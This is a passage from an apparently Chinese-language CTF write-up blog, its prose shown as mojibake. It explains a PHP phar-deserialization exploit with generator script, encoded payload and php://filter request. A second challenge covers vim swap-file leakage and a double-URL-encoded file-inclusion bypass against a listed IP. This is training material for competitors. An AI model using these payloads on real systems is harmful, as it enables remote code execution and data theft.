class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>) &amp;&amp; @<span class="title function_ invoke__">copy</span>(<span class="variable">$filename</span> , <span class="string">&quot;/tmp/tmp.tmp&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Well done!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Copy failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User can play copy game.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">    <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>) || !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$data</span>-&gt;role === <span class="string">&quot;user&quot;</span> )&#123;</span><br><span class="line">        <span class="title function_ invoke__">game</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;role === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">set_session</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">check_session</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç®€å•çœ‹ä¸€ä¸‹ä»£ç å¯ä»¥å‘ç°å½“cookieä¸­æ²¡æœ‰session-dataå°±ä¼šè¿›å…¥set_sessionï¼Œå¦åˆ™checkã€‚</p><p>setçš„ session-dataçš„å€¼æ˜¯åºåˆ—åŒ–åçš„User(â€œuserâ€)å’Œä¸€ä¸ªä¸<code>$SECRET</code>è¿›è¡Œsha256åŠ å¯†çš„å€¼<code>$hmac</code>ç”¨â€”â€”â€”-è¿›è¡Œæ‹¼æ¥<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-202458507.png" class=""><br>è€Œcheckçš„å°±æ˜¯æ£€æµ‹å‰é¢çš„åºåˆ—åŒ–çš„å€¼å’Œ<code>$SECRET</code>çš„sha256åŠ å¯†å’Œåé¢çš„<code>$hmac</code>ä¸€ä¸ä¸€æ ·ã€‚ååºåˆ—å‰é¢çš„å€¼ï¼Œ<br>å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“SECRETæ‰€ä»¥æˆ‘ä»¬æ— æ³•å¯¹å‰é¢çš„åºåˆ—åŒ–è¿›è¡Œç¯¡æ”¹ã€‚<br>æˆ‘ä»¬çœ‹åˆ°å½“æˆ‘ä»¬ä¸ºuseræ—¶å…¶å›è¿›å…¥gameè¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>) &amp;&amp; @<span class="title function_ invoke__">copy</span>(<span class="variable">$filename</span> , <span class="string">&quot;/tmp/tmp.tmp&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Well done!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Copy failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User can play copy game.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªcopyå‡½æ•°éå¸¸çš„æ‰çœ¼ã€‚çœ‹åˆ°è¿™ç§æ–‡ä»¶å¤„ç†å‡½æ•°æˆ‘ä»¬ç¬¬ä¸€æ—¶é—´åº”è¯¥éƒ½ä¼šæƒ³åˆ°pharååºåˆ—åŒ–ï¼Œè€Œpharååºåˆ—åŒ–éœ€è¦é…åˆæ–‡ä»¶ä¸Šä¼ ï¼Œè™½ç„¶è¿™é‡Œæ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨sessionè¿›åº¦ä¸Šä¼ (æˆ‘åœ¨sessionååºåˆ—åŒ–æœ‰å†™è¿‡)<br><a href="/2024/05/06/sessionååºåˆ—åŒ–/">sessionååºåˆ—åŒ–</a></p><p>ä½†æ˜¯å…¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯sessionè¿›åº¦ä¸Šä¼ æ˜¯ä¼šå­˜åœ¨å†—ä½™æ•°æ®çš„ï¼Œå¦‚ä¸‹</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241209-183603369.png" class="">  <img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241209-183553476.png" class="">  <p>å¯ä»¥å‘ç°æˆ‘ä»¬è¿›åº¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé™¤äº†æˆ‘ä»¬æƒ³ä¼ çš„æ•°æ®lllllllllllä¹‹å¤–å‰é¢å’Œåé¢éƒ½æœ‰å†—ä½™æ•°æ®ã€‚<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨php,base64_decodeçš„ç‰¹æ€§æ¥è¿›è¡Œè¿‡æ»¤æˆ‘è¿™é‡Œå°±ä¹‹é—´ç”¨ä¹‹å‰æ‰“ctfshowå…ƒæ—¦æ¯çš„è„šæœ¬æ¥æ¶ˆé™¤äº†ï¼Œè¿™ä¸ªè„šæœ¬ä¸ç”¨é¢å¤–è¡¥ä½æ•°æ¯”è¾ƒæ–¹ä¾¿<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar123.phar&quot;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$c</span>,<span class="string">&quot;utf-16le&quot;</span>,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$g</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="title function_ invoke__">quoted_printable_decode</span>(<span class="string">&quot;ctfshowshowshowwww&quot;</span>.<span class="variable">$g</span>.<span class="string">&quot;aaaaaaaaaaaaaa&quot;</span>),<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-16le&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„è„šæœ¬æ˜¯åˆ©ç”¨äº†å­—ç¬¦çš„å­—ç¬¦é›†ç±»å‹è½¬æ¢ï¼Œä½†å­—ç¬¦é›†ç”±utf-16leè½¬ä¸ºutf-8æ—¶ä¼šåœ¨æ¯ä¸ªå­—ç¬¦åé¢åŠ ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œè€Œå½“utf-8è½¬ä¸ºutf-16leæ—¶å…¶ä¼šå°†ä¸å¯è§å­—ç¬¦ä¸å‰é¢ä¸€ä¸ªå­—ç¬¦å½“åˆä¸€ä¸ªæ•´ä½“è¿›è¡Œç¼–ç ã€‚è€Œå½“æ²¡æœ‰è¿™ä¸ªä¸å¯è§å­—ç¬¦æ—¶ï¼Œå°†â€utf-8â€è½¬ä¸ºâ€utf-16leâ€ï¼Œè¿™äº›è¢«è½¬æ¢çš„å­—ç¬¦å°†å…¨å˜ä¸ºä¹±ç ï¼Œå³éasciiå­—ç¬¦å³ï¼Œébase64ç è¡¨å­—ç¬¦ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°†æˆ‘ä»¬çš„payloadä»utf-16leç¼–ç åˆ°utf-8ã€‚é‚£ä¹ˆåœ¨ä¹‹åæˆ‘ä»¬åœ¨åˆ©ç”¨ä¼ªåè®®çš„è¿‡æ»¤å™¨ï¼Œå°±å¯ä»¥è½¬æ¢ç¼–ç ï¼Œä»è€Œä½¿ç”¨base64è§£ç å»é™¤éç è¡¨å­—ç¬¦</p><h2 id="pahr-payload"><a href="#pahr-payload" class="headerlink" title="pahr_payload"></a>pahr_payload</h2><p>è¿™é¢˜çš„phar æ–‡ä»¶è¿˜æ˜¯ç‹ å¥½ç”Ÿæˆçš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$SECRET</span>  =<span class="string">&quot;asasas&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$role</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">        <span class="comment">#eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>) &amp;&amp; @<span class="title function_ invoke__">copy</span>(<span class="variable">$filename</span> , <span class="string">&quot;./tmp.tmp&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Well done!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Copy failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User can play copy game.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">    <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>) || !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$data</span>-&gt;role === <span class="string">&quot;user&quot;</span> )&#123;</span><br><span class="line">        <span class="title function_ invoke__">game</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;role === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar123.phar&quot;</span>);  <span class="comment">//ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œåå­—ä¸ºphar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//ä¸‹é¢ç»†è®²</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubå†…å®¹</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="string">&#x27;system(&quot;/readflag&quot;);&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//å°†åˆ›å»ºçš„å¯¹è±¡aå†™å…¥åˆ°Metadataä¸­</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//æ·»åŠ è¦è¿›è¡Œå‹ç¼©çš„æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸ºtestï¼Œæ–‡ä»¶å†…å®¹ä¸ºtestaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>ä¸ªäººæ²¡æœ‰åˆ ç±»æ–¹æ³•çš„ä¹ æƒ¯ï¼Œæ‰€ä»¥æ¯”è¾ƒé•¿ï¼Œæ³¨æ„æœ€åå‘½ä»¤æ‰§è¡Œæ–¹æ³•çš„evalå‡½æ•°è¦æ³¨é‡Šä¸ç„¶å½±å“æ–‡ä»¶ç”Ÿæˆ</p><p>å°†ç”Ÿæˆçš„æ–‡ä»¶é€šè¿‡ä¸Šé¢çš„è„šæœ¬æ¥base64ç¼–ç ï¼Œç¼–ç è½¬æ¢ï¼Œå› ä¸ºæœ‰çš„æ–‡ä»¶é™¤äº†å‡½æ•°æ— æ³•å¤„ç†ç©ºå­—ç¬¦ï¼Œæ‰€ä»¥å†quoted_printableç¼–ç ä¸€ä¸‹ã€‚</p><p>ç”Ÿæˆçš„payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=</span><br><span class="line">=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00=</span><br><span class="line">Q=00p=00t=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=</span><br><span class="line">=00A=00A=00A=00A=00A=00A=00A=003=00A=00A=00A=00A=00T=00z=00o=001=00O=00i=00=</span><br><span class="line">J=00B=00Z=00G=001=00p=00b=00i=00I=006=00M=00T=00p=007=00c=00z=00o=000=00O=</span><br><span class="line">=00i=00J=00j=00b=002=00R=00l=00I=00j=00t=00z=00O=00j=00I=00w=00O=00i=00J=00=</span><br><span class="line">z=00e=00X=00N=000=00Z=00W=000=00o=00I=00i=009=00y=00Z=00W=00F=00k=00Z=00m=</span><br><span class="line">=00x=00h=00Z=00y=00I=00p=00O=00y=00I=007=00f=00Q=00g=00A=00A=00A=00B=000=00=</span><br><span class="line">Z=00X=00N=000=00L=00n=00R=004=00d=00A=00c=00A=00A=00A=00A=008=00t=001=00Z=</span><br><span class="line">=00n=00B=00w=00A=00A=00A=00E=00S=00y=00G=004=00i=002=00A=00Q=00A=00A=00A=00=</span><br><span class="line">A=00A=00A=00A=00H=00R=00l=00c=003=00R=00h=00Y=00W=00H=00M=00z=00l=00/=00C=</span><br><span class="line">=00L=00v=00F=00A=00a=00n=00I=00P=00V=00G=00+=00M=00B=00j=00Z=00Y=004=00p=00=</span><br><span class="line">t=00o=00e=00w=00I=00A=00A=00A=00B=00H=00Q=00k=001=00C=00</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/tmp/sess_LL</span><br></pre></td></tr></table></figure><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241209-190144847.png" class="">  </p><p>è¿™é‡Œç”¨è¿›åº¦ä¸Šä¼ ï¼Œæ¥ä¸Šä¼ sessionæ–‡ä»¶ï¼Œç„¶åå†ä½¿ç”¨php://filterä¼ªåè®®å†™å…¥æ¶ˆé™¤å†—ä½™æ•°æ®çš„payload</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241209-191954301.png" class="">  <p>æœ€åå°±æ˜¯åˆ©ç”¨å†™å…¥çš„tmp.tmpè§¦å‘pharååºåˆ—åŒ–</p><h1 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h1><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-164548139.png" class="">  <p>ç®€å•æ‰«ä¸€ä¸‹ç›®å½•æˆ‘ä»¬å¯ä»¥å‘ç°å¤‡ä»½æ–‡ä»¶æ³„éœ².è¿™ç§ä¸šåŠ¡vimå¼ºé€€å¯¼è‡´çš„å¤‡ä»½æ–‡ä»¶æ³„éœ²æˆ‘ä»¬å¯ä»¥ä½¿ç”¨vim -r file.swpæ¥æ¢å¤<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-101816492.png" class="">  </p><p>çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶çš„æ˜¯ä¸€ä¸ªå­˜æœ‰guestè´¦å·å¯†ç çš„ä¿¡æ¯æ³„éœ²</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-164822161.png" class="">  <p>ç™»é™†åä¼šå‘ç°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„æ¼æ´ã€‚å› ä¸ºå½“åŒ…å«phpæ–‡ä»¶æ—¶å…¶ä¼šç›´æ¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥çŒœæµ‹åå°ä¸ºincludeã€‚äº§ç”Ÿä½¿ç”¨ä¼ªåè®®åŒ…å«</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-164958201.png" class="">  <p>å¯ä»¥å‘ç°å…¶è¿›è¡Œäº†è¿‡äºï¼Œç®€å•å¯¹å‚æ•°è¿›è¡Œæµ‹è¯•å¯ä»¥å‘ç°æ˜¯convertè¢«è¿‡æ»¤äº†ã€‚<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒé‡urlç¼–ç ç»•è¿‡ã€‚è¿™æ˜¯å› ä¸ºphpä¼ªåè®®ä¸­çš„è¿‡æ»¤å™¨å³ä½¿æ˜¯è¢«urlç¼–ç ä¹Ÿæ˜¯å¯ä»¥è§£æçš„ï¼Œæœ‰å…´è¶£çš„å¯ä»¥æœ¬åœ°å°è¯•<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://125.70.243.22:31545/guest.php?path=php://filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=index.php</span><br></pre></td></tr></table></figure><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-165254892.png" class=""><br>å°±è¿™æ ·é€šè¿‡phpæ–‡ä»¶é‡Œæåˆ°çš„å…¶ä»–phpæ–‡ä»¶åæ¥ä¸€æ­¥æ­¥æ‰’ä¸‹æºç <br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-165431931.png" class=""><br>çœ‹æºç ç¡®å®æ˜¯includeä½†æ˜¯å› ä¸ºå…¶è¿‡æ»¤äº†logæˆ‘ä»¬æ— æ³•è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-170012921.png" class="">  <p>è€Œä¸”å…¶register_argc_argvæœªå¼€å¯ä½¿ç”¨æˆ‘ä»¬æ— æ³•ä½¿ç”¨pearcmd.phpæ¥è¿›è¡Œæ–‡ä»¶åŒ…å«<br>åªè¦php://inputå’Œdata://è¿™ç§å°±æ›´ä¸ç”¨è¯´äº†</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-170249617.png" class="">  <p>æˆ‘ä»¬å†index.phpå¯ä»¥å‘ç°è¿™ä¸ªphpæ–‡ä»¶è¯»å–ä¸€ä¸‹<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241210-170311487.png" class=""><br>ä¼šå‘ç°è´¦å·å¯†ç ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç™»é™†adminè´¦å·äº†<br><img 